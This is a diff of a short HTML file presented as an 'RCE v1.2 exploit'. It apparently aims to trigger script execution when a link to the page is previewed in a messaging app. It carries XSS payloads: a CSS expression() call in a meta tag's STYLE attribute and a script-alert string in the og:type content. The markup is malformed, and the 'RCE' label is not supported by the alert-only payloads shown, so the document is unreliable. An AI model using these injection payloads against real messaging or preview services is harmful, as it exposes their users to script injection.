@@ -2,10 +2,20 @@
 RCE v1.2 exploit when user recives a message with url with this html, description with javascript code will maybe execute.
 
 <html prefix="og: https://ogp.me/ns#">
-<head>
-<title>The Rock Exploit(1996)</title>
-<meta property="the:property" content="100 results for" STYLE="width:expression(alert('XSS'));" blah=" (Page 1)" />
+ <head>
+  <meta charset="UTF-8">
+  <meta name="description" content="Free Web tutorials">
+  <meta name="keywords" content="HTML,CSS,XML,JavaScript">
+  <meta name="author" content="John Doe">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="the:property" content="100 results for" STYLE="width:expression(alert('XSS'));" blah=" (Page 1)" />
  />"
+ </head>
+</head>
+<body>
+
+<title>The Rock Exploit(1996)</title>
+
 <meta property="og:type" content="
 &lt;script&gt;alert("bad!")&lt;/script&gt;
 &lt;dog&gt;
